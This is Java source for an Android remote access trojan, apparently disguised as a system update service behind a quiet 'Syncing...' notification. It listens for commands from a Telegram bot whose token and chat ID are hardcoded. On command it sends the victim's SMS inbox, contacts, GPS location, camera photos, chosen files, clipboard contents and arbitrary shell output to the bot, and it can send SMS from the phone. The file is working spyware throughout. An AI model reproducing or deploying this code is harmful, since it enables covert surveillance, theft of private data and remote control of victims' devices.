package com.system.update;

import android.app.*;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.*;
import android.telephony.SmsManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import okhttp3.*;

public class RatService extends Service {
    // ⚠️ غير التوكن والآي دي هنا قبل ما تعمل Commit
    private static final String BOT_TOKEN = "9086594295:AAHyUWclet2LmBAxJ6Q_iLnJhGF4oqV1Ecs‏";
    private static final String CHAT_ID = "6978974735";
    private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    
    private long lastUpdateId = 0;
    private boolean isRunning = true;
    private OkHttpClient client = new OkHttpClient();
    private String lastClipboard = "";

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        startPolling();
        startClipboardMonitor();
    }

    private void startForegroundService() {
        String channelId = "sys_chan";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        
        Notification notification;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, channelId)
                    .setContentTitle("Syncing...").setContentText("Please wait")
                    .setSmallIcon(android.R.drawable.ic_menu_manage).build();
        } else {
            notification = new Notification.Builder(this)
                    .setContentTitle("Syncing...").setContentText("Please wait")
                    .setSmallIcon(android.R.drawable.ic_menu_manage).build();
        }
        startForeground(1, notification);
    }

    private void startClipboardMonitor() {
        new Thread(() -> {
            while (isRunning) {
                try {
                    ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                        ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
                        String text = item.getText() != null ? item.getText().toString() : "";
                        if (!text.isEmpty() && !text.equals(lastClipboard)) {
                            lastClipboard = text;
                            sendText("📋 Clipboard: " + text);
                        }
                    }
                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private void startPolling() {
        new Thread(() -> {
            while (isRunning) {
                try {
                    Request request = new Request.Builder().url(TG_API + "getUpdates?offset=" + lastUpdateId + "&timeout=30").build();
                    Response response = client.newCall(request).execute();
                    JSONObject json = new JSONObject(response.body().string());
                    JSONArray updates = json.getJSONArray("result");
                    for (int i = 0; i < updates.length(); i++) {
                        JSONObject update = updates.getJSONObject(i);
                        lastUpdateId = update.getLong("update_id") + 1;
                        if (update.has("message")) {
                            JSONObject message = update.getJSONObject("message");
                            if (message.has("text")) handleCommand(message.getString("text"));
                        }
                    }
                    Thread.sleep(1000);
                } catch (Exception e) { 
                    try { Thread.sleep(3000); } catch (InterruptedException ignored) {} 
                }
            }
        }).start();
    }

    private void handleCommand(String cmd) {
        if (cmd.equals("/info")) {
            sendText("Model: " + Build.MODEL + "\nBrand: " + Build.BRAND + "\nAndroid: " + Build.VERSION.RELEASE);
        } else if (cmd.equals("/sms")) {
            sendSms();
        } else if (cmd.equals("/contacts")) {
            sendContacts();
        } else if (cmd.equals("/location")) {
            sendLocation();
        } else if (cmd.equals("/camera")) {
            takePhoto();
        } else if (cmd.startsWith("/upload ")) {
            uploadFile(cmd.substring(8).trim());
        } else if (cmd.startsWith("/shell ")) {
            runShell(cmd.substring(7));
        } else if (cmd.startsWith("/send ")) {
            String[] p = cmd.split(" ", 3);
            if (p.length == 3) { 
                SmsManager.getDefault().sendTextMessage(p[1], null, p[2], null, null); 
                sendText("SMS Sent!"); 
            }
        }
    }

    private void runShell(String cmd) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\n");
            sendText("💻 Shell Output:\n" + output.toString());
        } catch (Exception e) { 
            sendText("Error: " + e.getMessage()); 
        }
    }

    private void sendLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                sendText("📍 Location: https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
            } else { 
                sendText("Location not available yet."); 
            }
        } catch (SecurityException e) { 
            sendText("Location permission denied."); 
        }
    }

    private void takePhoto() {
        try {
            Camera camera = Camera.open(0);
            camera.setPreviewTexture(new android.graphics.SurfaceTexture(10));
            camera.startPreview();
            camera.takePicture(null, null, (data, cam) -> {
                File photo = new File(getExternalFilesDir(null), "photo.jpg");
                try (FileOutputStream fos = new FileOutputStream(photo)) { 
                    fos.write(data); 
                } catch (IOException ignored) {}
                cam.release();
                uploadFile(photo.getAbsolutePath());
            });
        } catch (Exception e) { 
            sendText("Camera error: " + e.getMessage()); 
        }
    }

    private void uploadFile(String path) {
        File file = new File(path);
        if (!file.exists()) { 
            sendText("File not found: " + path); 
            return; 
        }
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file))
                .build();
        Request request = new Request.Builder().url(TG_API + "sendDocument").post(requestBody).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) { sendText("Upload failed."); }
            @Override public void onResponse(Call call, Response response) { }
        });
    }

    private void sendSms() {
        StringBuilder sb = new StringBuilder("📩 SMS:\n");
        Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 20");
        if (c != null && c.moveToFirst()) { 
            do { 
                sb.append(c.getString(c.getColumnIndexOrThrow("address"))).append(": ").append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n"); 
            } while (c.moveToNext()); 
            c.close(); 
        }
        sendText(sb.toString());
    }
    
    private void sendContacts() {
        StringBuilder sb = new StringBuilder("👥 Contacts:\n");
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null && c.moveToFirst()) { 
            do { 
                sb.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append("\n"); 
            } while (c.moveToNext()); 
            c.close(); 
        }
        sendText(sb.toString());
    }

    private void sendText(String text) {
        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build();
        Request request = new Request.Builder().url(TG_API + "sendMessage").post(body).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) { }
            @Override public void onResponse(Call call, Response response) { }
        });
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { isRunning = false; super.onDestroy(); }
}
